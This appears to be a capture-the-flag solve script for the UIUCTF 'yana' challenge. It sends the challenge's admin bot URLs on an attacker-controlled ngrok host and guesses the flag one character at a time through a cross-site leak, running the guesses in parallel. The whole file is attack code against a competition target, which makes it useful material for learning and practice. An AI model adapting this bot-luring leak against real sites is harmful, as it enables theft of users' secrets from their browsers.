import time
from pwn import *
from multiprocessing import Pool

# Send my URL (includes an iframe to the yana page)
start = "https://2cd87fccf2d0.ngrok.io/yana.php#uiuctf{y"

def attack_list(charlist):

    # Test every char in the charlist
    for ch in charlist:
        # Connect to the socket to send the URL
        r = remote('yana-bot.chal.uiuc.tf', 1337)
        url = start + ch
        r.sendafter('Please send me a URL to open.\n', url + '\n')
        log.info(r.recvline())
        time.sleep(1)

# Divided the charlist in groups to paralellize
charlists = [
    '_0123456', 
    '789aeiou', 
    'Xbcdfghj',
    'klmnpqrs',
    'tvwxyz}'
]

if __name__ == '__main__':
    with Pool(5) as p:
        print(p.map(attack_list, charlists))